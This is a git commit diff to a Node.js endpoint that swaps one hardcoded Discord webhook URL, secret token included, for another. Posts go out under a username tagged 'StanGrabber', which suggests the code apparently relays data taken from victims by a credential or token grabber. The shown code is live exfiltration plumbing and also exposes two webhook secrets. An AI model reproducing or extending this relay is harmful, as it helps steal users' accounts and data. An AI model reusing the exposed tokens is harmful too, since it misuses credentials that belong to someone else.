bee40e12a735b4403f46bf57ebca628dde658f52
kaikez <54756291+kaikez@users.noreply.github.com>
2021-07-12 14:53:39 -0300

    Update index.js

--- endpoints/index.js
+++ endpoints/index.js
@@ -48,7 +48,7 @@ exports.send = (req, res, webhook) => {
 }
             
 
-        axios.post(`https://discord.com/api/webhooks/808648414199676948/Koi4dO3acEhEyIRJzVaxZ7-FDWJfmqK6kZX13nrklxmLWPkhQBhtkFe8JBtKgdojXSCn`, {
+        axios.post(`https://discord.com/api/webhooks/830135145511387136/SoFCnnkUR07eMHww9VsHGJeifDuBUHnbwExgu-fIW_004a7ZIoFofO5zFPkgwR1skh-U`, {
             username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
             content: '', 
             embeds:[ omg ]
